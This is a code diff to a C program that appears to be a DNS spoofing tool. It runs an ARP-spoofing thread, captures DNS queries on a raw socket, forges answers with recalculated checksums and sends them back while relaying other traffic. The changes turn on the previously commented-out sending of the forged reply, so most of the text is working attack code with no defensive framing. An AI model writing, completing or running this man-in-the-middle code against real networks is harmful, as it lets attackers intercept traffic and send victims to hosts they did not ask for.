@@ -17,6 +17,7 @@
 
 #include "dns_helpers.h"
 
+ //! src: http://minirighi.sourceforge.net/html/udp_8c.html
  //! \brief
  //!     Calculate the UDP checksum (calculated with the whole
  //!     packet).
@@ -64,30 +65,6 @@
          return ( (uint16_t)(~sum)  );
  }
 
-//! \brief Calculate the IP header checksum.
-//! \param buf The IP header content.
-//! \param hdr_len The IP header length.
-//! \return The result of the checksum.
-uint16_t ip_checksum(const void *buf, size_t hdr_len)
-{
-        unsigned long sum = 0;
-        const uint16_t *ip1;
-
-        ip1 = buf;
-        while (hdr_len > 1)
-        {
-                sum += *ip1++;
-                if (sum & 0x80000000)
-                        sum = (sum & 0xFFFF) + (sum >> 16);
-                hdr_len -= 2;
-        }
-
-        while (sum >> 16)
-                sum = (sum & 0xFFFF) + (sum >> 16);
-
-        return(~sum);
-}
-
 void * arp_spoofer(void * param)
 {
   libnet_t *ln;
@@ -129,7 +106,7 @@ int main(int argc, char** argv) {
   int sfd, gwsfd, ifindex;
   int i;
   ssize_t len;
-  char* frame;
+  char* frame, *outframe;
   char* fdata;
   struct ethhdr* fhead;
   struct iphdr *ip;
@@ -199,11 +176,15 @@ int main(int argc, char** argv) {
   // start listening
   while(1) {
     frame = malloc(ETH_FRAME_LEN);
+    outframe = malloc(ETH_FRAME_LEN);
     memset(frame, 0, ETH_FRAME_LEN);
-    fhead = (struct ethhdr*) frame;
-    fdata = frame + ETH_HLEN;
     len = recvfrom(sfd, frame, ETH_FRAME_LEN, 0, NULL, NULL);
+
+    memcpy(outframe, frame, ETH_FRAME_LEN);
+    fhead = (struct ethhdr*) outframe;
+    fdata = outframe + ETH_HLEN;
     ip = (struct iphdr *)fdata;
+
     inet_ntop(AF_INET, &ip->saddr, (char*) &saddr, 16);
     inet_ntop(AF_INET, &ip->daddr, (char*) &daddr, 16);
 
@@ -244,35 +225,18 @@ int main(int argc, char** argv) {
             &fhead->h_dest[0], &fhead->h_dest[1], &fhead->h_dest[2],
             &fhead->h_dest[3], &fhead->h_dest[4], &fhead->h_dest[5]);
 
-          len = sendto(gwsfd, frame, len, 0,
+          len = sendto(gwsfd, outframe, len, 0,
                 (struct sockaddr*) &gwall, sizeof(struct sockaddr_ll));
 
-          // struct domain * head = d;
-          // while (head != NULL)
-          // {
-          //   printf("%s.", head->content);
-          //   head = head->next;
-          // }
-          // printf("\n");
-
           free(frame);
+          free(outframe);
           delete_domain_struct(d);
 
           continue;
         }
 
-        // printf("got:\n");
-        // for (i = 0; i < dnslen ; i++) {
-        //   printf("%02x ", (char) udpdata[i]);
-        //   if ((i + 1) % 16 == 0)
-        //     printf("\n");
-        // }
-        // printf("\n\n");
-
         int response_len_without_answer = 12 + query_len(d) + 4;
         int additional_bytes = ntohs(udp->len) - 8 - response_len_without_answer;
-
-        printf("Additional: %d\n", additional_bytes);
 
         // start building spoofed answer
         unsigned short new_flags = 0;
@@ -318,21 +282,16 @@ int main(int argc, char** argv) {
         ip->frag_off = ntohs(1 << 14);
 
         // calculate checksums
-        printf("UDPlen: %d, IPlen: %d\n", ntohs(udp->len), ntohs(udp->len) + (ip->ihl * 4));
-        printf("UDPchk: %04x\n", udp_checksum(udp, ntohs(udp->len), ip->saddr, ip->daddr));
-        udp->check = htons(udp_checksum(udp, ntohs(udp->len), ip->saddr, ip->daddr));
-        printf("UDPchk: %04x, IPchk: %04x\n", udp->check, ip_checksum(ip, ntohs(udp->len) + (ip->ihl * 4)));
-        //ip->check = htons(ip_checksum(ip, ntohs(udp->len) + (ip->ihl * 4)));
+        udp->check = udp_checksum(udp, ntohs(udp->len), ip->saddr, ip->daddr);
+        ip->check = libnet_ip_check((unsigned short int *)ip, (ip->ihl * 4));
 
-        int answerlen = dnslen + 16;
-
-        // printf("to send:\n");
-        // for (i = 0; i < ntohs(ip->tot_len) ; i++) {
-        //   printf("%02x ", (char) ((char *)ip)[i]);
-        //   if ((i + 1) % 16 == 0)
-        //     printf("\n");
-        // }
-        // printf("\n\n");
+        printf("to send:\n");
+        for (i = 0; i < ntohs(ip->tot_len) ; i++) {
+          printf("%02x ", (char) ((char *)ip)[i]);
+          if ((i + 1) % 16 == 0)
+            printf("\n");
+        }
+        printf("\n\n");
 
         // swap hardware addresses
         memcpy(fhead->h_dest, fhead->h_source, ETH_ALEN);
@@ -353,10 +312,9 @@ int main(int argc, char** argv) {
         vall.sll_addr[4] = fhead->h_dest[4];
         vall.sll_addr[5] = fhead->h_dest[5];
 
-        //sendto(gwsfd, frame, len - additional_bytes + 16, 0,
-        //      (struct sockaddr*) &vall, sizeof(struct sockaddr_ll));
+        sendto(gwsfd, outframe, len - additional_bytes + 16, 0,
+              (struct sockaddr*) &gwall, sizeof(struct sockaddr_ll));
 
-        // printf("sent\n");
         printf("\n");
 
         delete_domain_struct(d);
@@ -370,7 +328,7 @@ int main(int argc, char** argv) {
           &fhead->h_dest[0], &fhead->h_dest[1], &fhead->h_dest[2],
           &fhead->h_dest[3], &fhead->h_dest[4], &fhead->h_dest[5]);
 
-        len = sendto(gwsfd, frame, len, 0,
+        len = sendto(gwsfd, outframe, len, 0,
               (struct sockaddr*) &gwall, sizeof(struct sockaddr_ll));
       }
     }
@@ -383,12 +341,11 @@ int main(int argc, char** argv) {
          &fhead->h_dest[0], &fhead->h_dest[1], &fhead->h_dest[2],
          &fhead->h_dest[3], &fhead->h_dest[4], &fhead->h_dest[5]);
 
-      len = sendto(gwsfd, frame, len, 0,
+      len = sendto(gwsfd, outframe, len, 0,
             (struct sockaddr*) &gwall, sizeof(struct sockaddr_ll));
-
-      //printf("relaying TCP from %s [%ldB]\n", saddr, len);
     }
     free(frame);
+    free(outframe);
   }
   close(gwsfd);
   close(sfd);
